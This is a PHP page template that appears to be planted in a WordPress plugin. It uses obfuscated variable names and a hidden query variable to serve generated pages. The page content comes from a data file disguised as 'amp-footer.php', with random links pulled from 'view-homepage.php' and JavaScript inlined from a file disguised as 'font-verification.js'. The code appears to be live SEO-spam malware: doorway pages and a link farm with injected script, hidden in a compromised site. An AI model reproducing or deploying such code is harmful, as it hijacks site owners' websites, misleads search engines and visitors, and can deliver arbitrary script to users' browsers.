<?php
$b6qJn0AD = intval(get_query_var('ihyrcrud'));

if ($b6qJn0AD < 1 || $b6qJn0AD > 4906) return;
$pdN0F = file(plugin_dir_path(__FILE__).'amp-footer.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$tVszpHY = explode(';', $pdN0F[$b6qJn0AD]);
if (count($tVszpHY) < 2) return;
$orY2vOf = $tVszpHY[0];
$oJZYQJWyy  = $tVszpHY[1];
$hhIQM3 = $tVszpHY[2];
$f5sSy9CMb  = $tVszpHY[3];
$diTqRB = $tVszpHY[4];
set_query_var('xzcisfane', $orY2vOf);

$e4APORv = '';
$u17pHFka = plugin_dir_path(__FILE__).'view-homepage.php';
if (is_file($u17pHFka)) {
	$h6dbese = file($u17pHFka, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($h6dbese);
	shuffle($h6dbese);
	$mJZeJOfu = mt_rand(2, 5);
	if (count($h6dbese) > $mJZeJOfu) {
		for ($sp2Lp7vfr = 0; $sp2Lp7vfr < $mJZeJOfu; $sp2Lp7vfr++) {
			$zyKHV = array_shift($h6dbese);
			$e4APORv .= '<p><a href="'.$zyKHV.'">'.$zyKHV.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $orY2vOf; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $oJZYQJWyy . "</p>\n";
				if (strlen($f5sSy9CMb) > 0) echo "<p>" . $f5sSy9CMb . "</p>\n";
				if (strlen($hhIQM3) > 0) echo "<p>" . $hhIQM3 . "</p>\n";
				if (strlen($diTqRB) > 0) echo '<p><a href="#"><img src="'.$diTqRB.'"></a>' . "</p>\n";
				echo $e4APORv;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$t37lEej36 = plugin_dir_path(__FILE__) . 'font-verification.js';
if (is_file($t37lEej36)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($t37lEej36);
	echo '</script>';
}
get_footer();
?>
